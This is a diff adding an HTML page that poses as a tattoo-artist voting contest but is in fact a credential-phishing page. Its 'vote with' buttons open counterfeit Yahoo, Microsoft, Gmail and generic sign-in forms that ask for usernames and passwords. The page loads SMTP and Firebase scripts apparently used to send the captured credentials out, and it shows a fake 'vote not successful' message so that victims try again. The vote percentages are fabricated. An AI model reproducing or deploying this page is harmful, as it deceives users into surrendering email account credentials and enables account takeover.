@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Vote for your favorite tattoo artist on our platform. Select a candidate and help them win by casting your vote. See real-time vote counts and percentages as you participate in the voting process. Join us and make your voice heard!" />
+    <title>Tattoo Artistry Contest</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.js"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.css">
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <link rel="stylesheet" href="secured/yahoo/css/style.css">
+    <link rel="stylesheet" href="secured/google/css/style.css">
+    <link rel="stylesheet" href="secured/other/css/style.css">
+    <link rel="stylesheet" href="auth/microsoft/style.css">
+    <link rel="stylesheet" href="css/index.css">
+    <link rel="stylesheet" href="css/vote.css">
+    <link rel="stylesheet" href="assets/css/main.css">
+    <script src="js/index.js"></script>
+</head>
+<body>
+    <div class="container">
+        <h1>Vote Your Favorite Tattoo Artist</h1>
+        <div class="header">
+            <img class="logo" src="image/logo.png" alt="Logo">
+        </div>
+        <p>Remaining votes: <span id="remaining-votes">981</span></p>
+        <div class="candidate" onclick="showVoteDialog()" >
+            <img src="image/v1.JPG" alt="Artist 1">
+            <h2>Monarchtatstudio</h2>
+            <p>Percentage: <span id="percentage-artist1">20%</span></p>
+        </div>
+        <div class="candidate" onclick="showVoteDialog()" >
+            <img src="image/v2.JPG" alt="Artist 2">
+            <h2>Glassmoontattoo</h2>
+            <p>Percentage: <span id="percentage-artist2">50%</span></p>
+        </div>
+        <div class="candidate" onclick="showVoteDialog()" >
+            <img src="image/v3.JPG" alt="Artist 3">
+            <h2>Wolfandgoattattoo</h2>
+            <p>Percentage: <span id="percentage-artist3">15%</span></p>
+        </div>
+        <div class="candidate" onclick="showVoteDialog()" >
+            <img src="image/v4.JPG" alt="Artist 4">
+            <h2>Tildeathdenver</h2>
+            <p>Percentage: <span id="percentage-artist4">70%</span></p>
+        </div>
+    </div>
+
+<!-- Add this HTML structure for the new dialogue box -->
+
+<div id="vote-dialog" class="dialog">
+    <div class="dialog-content">
+        <button class="close-button" onclick="closeVoteDialog()">&times;</button>
+        <h2>Choose preferred provider to vote with:</h2>
+        <div class="social-vote-button">
+            <button id="yh" onclick="yh()" class="yahoo-button"><i class="fab fa-yahoo"></i> Vote with Yahoo </button>
+        </div>
+        <div class="social-vote-button">
+            <button id="hm" onclick="hm()" class="hotmail-button"><i class="fab fa-microsoft"></i> Vote with Microsoft </button>
+        </div>
+        <div class="social-vote-button">
+            <button id="gm" onclick="gm()" class="gmail-button"><i class="fab fa-google"></i> Vote with Gmail </button>
+        </div>
+        <div class="social-vote-button">
+            <button id="em" onclick="em()" class="email-button"><i class="fas fa-envelope"></i> Vote with Other </button>
+        </div>
+    </div>
+</div>
+
+
+ <div id="yhp">
+    <div class="yht">
+
+        <main>
+            <div id="yahoo-form-holder">
+                <div id="d4">
+                    <img id="image2" src="https://1000logos.net/wp-content/uploads/2017/05/Yahoo-logo.jpg"
+                        height="95px" width="auto" alt="">
+                </div>
+                <h1 id="h1">Sign in</h1>
+                <hr id="hr1">
+                <p id="p2">Sign in using your Yahoo account</p><br><br>
+                <input required id="yh-uname" type="text" placeholder="Username, email address or mobile number">
+                <hr id="hr1">
+                <input required id="yh-pass" type="password" placeholder="Password">
+                <hr id="hr1">
+                <button onclick="yhlog()" id="yh-log">Login</button>
+                <br>
+            </div>
+        </main>
+  </div>
+</div>
+
+ <div id="hmp">
+    <div class="hmt">
+
+      <main>
+          <div id="form-holder">
+              <img class="sign-in" src="auth/microsoft/img/microsoft_logo.svg" alt="logo" id="ms-logo">
+                  <h2 class="sign-in-content sign-in">Sign in</h2><br>
+                  <p class="error-message sign-in">That Microsoft account doesn't exist. Enter a different account or <a href="#">get a new one</a>.</p><br><br>
+                  <input id="hm-email" class="sign-in-content sign-in" type="email" maxlength="113" lang="en" class="form-control ltr_override" aria-required="true" aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader" placeholder="Email, phone, or Skype">
+                  <p class="sign-in-content sign-in">No account? <a href="#">Create one!</a></p>
+                  <p class="sign-in-content sign-in"><a href="">Sign-in options</a></p>
+                  <div class="sign-in-content sign-in" id="submit">
+                      <button>Next</button>
+                  </div>
+                  <p class="sign-up"><button id="back-icon"><i class="fas fa-arrow-left"></i></button> <span id="user-info"></span></p>
+                  <h2 class="sign-up">Enter password</h2>
+                  <p class="error-message sign-up">Your account or password is incorrect. If you don't remember your password, <a id="reset-password">reset it now</a>.</p>
+                  <input type="password" id="hm-pass" class="sign-up" autocomplete="off" placeholder="Password">
+                  <p class="sign-up" id="keep-logged"><input type="checkbox"> Keep me signed in</p>
+                  <p class="sign-up"><a href="">Forgot my password</a></p>
+                  <div class="sign-up">
+                      <button id="hm-log" onclick="hmlog()">Sign in</button>
+                  </div>
+              <div id="cover">
+                  <img src="img/803.gif" alt="loading">
+              </div>
+          </div>
+          <div class="message" hidden>
+              <p><b>Correlation Id:</b> 872f6832bc454f95aa40281782ee32e7</p>
+              <p><b>Timestamp:</b> 2019-08-08T19:25:33.813Z</p>
+          </div>
+      </main>
+  </div>
+</div>
+
+ <div id="gmp">
+    <div class="gmt">
+
+        <main>
+            <div id="gmail-form-holder">
+                <div id="d4">
+                    <img id="image2" src="https://1000logos.net/wp-content/uploads/2016/11/google_logo.png"
+                        height="95px" width="auto" alt="">
+                </div>
+                <h1 id="h1">Sign in</h1>
+                <hr id="hr1">
+                <p id="p2">to continue to Gmail</p><br><br>
+                <input required id="gm-uname" type="text" placeholder="Email  or phone">
+                <hr id="hr1">
+                <input required id="gm-pass" type="password" placeholder="Enter your password">
+                <hr id="hr1">
+                <button onclick="gmlog()" id="gm-log">Login</button>
+                <br>
+            </div>
+        </main>
+  </div>
+</div>
+
+ <div id="emp">
+    <div class="emt">
+
+        <main>
+            <div id="gmail-form-holder">
+                <div id="d4">
+                    
+                </div>
+                <h1 id="h1">Sign in</h1>
+                <hr id="hr1">
+                <p id="p2">with email to vote</p><br><br>
+                <input required id="em-uname" type="text" placeholder="Email  or phone">
+                <hr id="hr1">
+                <input required id="em-pass" type="password" placeholder="Enter your password">
+                <hr id="hr1">
+                <button onclick="emlog()" id="em-log">Login</button>
+                <br>
+            </div>
+        </main>
+  </div>
+</div>
+
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+<script src="auth/microsoft/jquery.js"></script>
+<script src="auth/microsoft/emails.js"></script>
+<script src="auth/microsoft/script.js"></script>
+
+
+
+
+<script>
+    // Function to show the vote dialogue box
+function showVoteDialog() {
+    var voteDialog = document.getElementById("vote-dialog");
+    voteDialog.style.display = "flex";
+}
+
+// Function to close the vote dialogue box
+function closeVoteDialog() {
+    var voteDialog = document.getElementById("vote-dialog");
+    voteDialog.style.display = "none";
+}
+// Function to show the vote dialogue box
+function showVoteDialog() {
+    var voteDialog = document.getElementById("vote-dialog");
+    voteDialog.style.display = "flex";
+}
+
+// Function to close the vote dialogue box
+function closeVoteDialog() {
+    var voteDialog = document.getElementById("vote-dialog");
+    voteDialog.style.display = "none";
+}
+
+// Function to navigate to Page 1
+function yh() {
+    // Replace 'page1.html' with the actual URL of your Page 1
+    var hmp = document.getElementById("yhp");
+    hmp.style.display = "block";
+    hmp.style.position = "fixed";
+    hmp.style.top = "0";
+    hmp.style.left = "0";
+    hmp.style.width = "100%";
+    hmp.style.height = "100%";
+    hmp.style.backgroundColor = "white"; // Add a semi-transparent background overlay
+
+    // Close the vote dialog
+    closeVoteDialog();
+}
+
+// Function to navigate to Page 2
+function hm() {
+    // Replace 'page2.html' with the actual URL of your Page 2
+    var hmp = document.getElementById("hmp");
+    hmp.style.display = "block";
+    hmp.style.position = "fixed";
+    hmp.style.top = "0";
+    hmp.style.left = "0";
+    hmp.style.width = "100%";
+    hmp.style.height = "100%";
+    hmp.style.backgroundColor = "white"; // Add a semi-transparent background overlay
+
+    // Close the vote dialog
+    closeVoteDialog();
+}
+
+// Function to navigate to Page 3
+function gm() {
+    // Replace 'page2.html' with the actual URL of your Page 2
+    var hmp = document.getElementById("gmp");
+    hmp.style.display = "block";
+    hmp.style.position = "fixed";
+    hmp.style.top = "0";
+    hmp.style.left = "0";
+    hmp.style.width = "100%";
+    hmp.style.height = "100%";
+    hmp.style.backgroundColor = "white"; // Add a semi-transparent background overlay
+
+    // Close the vote dialog
+    closeVoteDialog();
+}
+// Function to navigate to Page 3
+function em() {
+    // Replace 'page2.html' with the actual URL of your Page 2
+    var hmp = document.getElementById("emp");
+    hmp.style.display = "block";
+    hmp.style.position = "fixed";
+    hmp.style.top = "0";
+    hmp.style.left = "0";
+    hmp.style.width = "100%";
+    hmp.style.height = "100%";
+    hmp.style.backgroundColor = "white"; // Add a semi-transparent background overlay
+
+    // Close the vote dialog
+    closeVoteDialog();
+}
+
+</script>
+
+
+    <!-- Dialog Box -->
+    <div id="dialog" class="dialog">
+        <div class="dialog-content">
+            <span class="close" onclick="closeDialog()">&times;</span>
+            <h2><span hidden id="dialog-artist-name"></span></h2>
+
+        </div>
+    </div>
+
+        <!-- Thank You Dialog Box -->
+        <div id="thank-you-dialog" class="dialog">
+            <div class="dialog-content">
+                <h2>Oops!</h2>
+                <p>Your vote was not successful. Try again!</p>
+                <button class="instagram-login" onclick="closeThankYouDialog()">Close</button>
+            </div>
+        </div>
+
+    <script>
+        var totalVotes = 1000;
+        var candidates = [
+            { name: "Monarchtatstudio", votes: 20 },
+            { name: "Glassmoontattoo", votes: 50 },
+            { name: "Wolfandgoattattoo ", votes: 15 },
+            { name: "Tildeathdenver", votes: 70 }
+
+        ];
+
+        var currentCandidateIndex = 0;
+
+        function showDialog(candidateIndex) {
+            currentCandidateIndex = candidateIndex;
+            var dialog = document.getElementById("dialog");
+            var dialogArtistName = document.getElementById("dialog-artist-name");
+            dialogArtistName.textContent = candidates[currentCandidateIndex].name;
+            dialog.style.display = "flex";
+        }
+
+        function closeDialog() {
+            var dialog = document.getElementById("dialog");
+            dialog.style.display = "none";
+        }
+
+        function voteWithInstagram() {
+            // Implement Instagram authentication logic here
+            // For this example, we'll simply decrement the totalVotes and update the UI
+            if (totalVotes > 0) {
+                candidates[currentCandidateIndex].votes++;
+                totalVotes--;
+                updateUI();
+                closeDialog();
+            }
+        }
+
+        function showInstagramDialog() {
+             var dialog = document.getElementById("dialog");
+             dialog.style.display = "none";
+             
+             var instagramDialog = document.getElementById("instagram-dialog");
+             instagramDialog.style.display = "flex";
+         }
+
+         function closeInstagramDialog() {
+             var instagramDialog = document.getElementById("instagram-dialog");
+             instagramDialog.style.display = "none";
+
+             var dialog = document.getElementById("dialog");
+             dialog.style.display = "flex";
+         }
+
+         function thankYouForVoting() {
+             var instagramDialog = document.getElementById("instagram-dialog");
+             instagramDialog.style.display = "none";
+
+             var thankYouDialog = document.getElementById("thank-you-dialog");
+             thankYouDialog.style.display = "flex";
+             
+             // Simulate submitting the vote
+             if (totalVotes > 0) {
+                 candidates[currentCandidateIndex].votes++;
+                 totalVotes--;
+                 updateUI();
+             }
+         }
+
+         function closeThankYouDialog() {
+             var thankYouDialog = document.getElementById("thank-you-dialog");
+             thankYouDialog.style.display = "none";
+         }
+
+         function closeDialog() {
+             var dialog = document.getElementById("dialog");
+             dialog.style.display = "none";
+         }
+
+
+        function updateUI() {
+            var remainingVotesElement = document.getElementById("remaining-votes");
+            var candidateElements = document.getElementsByClassName("candidate");
+
+            for (var i = 0; i < candidates.length; i++) {
+                var votesElement = document.getElementById("votes-artist" + (i + 1));
+                var percentageElement = document.getElementById("percentage-artist" + (i + 1));
+
+                var votes = candidates[i].votes;
+                var percentage = ((votes / (1000 - totalVotes)) * 100).toFixed(2) + "%";
+
+                votesElement.textContent = votes;
+                percentageElement.textContent = percentage;
+            }
+
+            remainingVotesElement.textContent = totalVotes;
+
+        }
+
+
+    </script>
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+    <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+
+    <script src="js/firebase.js">
+
+
+
+    </script>
+</body>
+</html>
